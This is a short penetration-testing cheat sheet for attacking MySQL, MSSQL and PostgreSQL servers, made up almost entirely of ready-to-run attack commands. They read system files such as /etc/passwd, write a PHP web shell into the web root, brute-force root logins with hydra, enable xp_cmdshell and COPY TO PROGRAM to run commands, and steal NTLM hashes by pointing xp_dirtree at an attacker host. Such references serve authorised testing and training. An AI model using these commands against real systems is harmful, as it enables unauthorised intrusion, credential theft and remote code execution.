# Database Enumeration

## MySQL (3306/tcp)

```bash
mysql -u root -p'password' -h TARGET
SHOW DATABASES; USE db; SHOW TABLES; SELECT * FROM users;
SELECT LOAD_FILE('/etc/passwd');                              # read files
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';  # write web shell
hydra -l root -P rockyou.txt mysql://TARGET -t 4 -f          # brute force
```

## MSSQL (1433/tcp)

```bash
impacket-mssqlclient user:pass@TARGET
impacket-mssqlclient user:pass@TARGET -windows-auth

# RCE via xp_cmdshell
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
xp_cmdshell 'whoami'

# Steal NTLM hash
EXEC xp_dirtree '\\KALI_IP\share'                           # catch with Responder

crackmapexec mssql TARGET -u user -p pass -x "whoami"
```

## PostgreSQL (5432/tcp)

```bash
psql -h TARGET -U user -d database
\list   \dt   SELECT * FROM users;
SELECT pg_read_file('/etc/passwd');                           # read files
COPY (SELECT '') TO PROGRAM 'id';                            # RCE
```
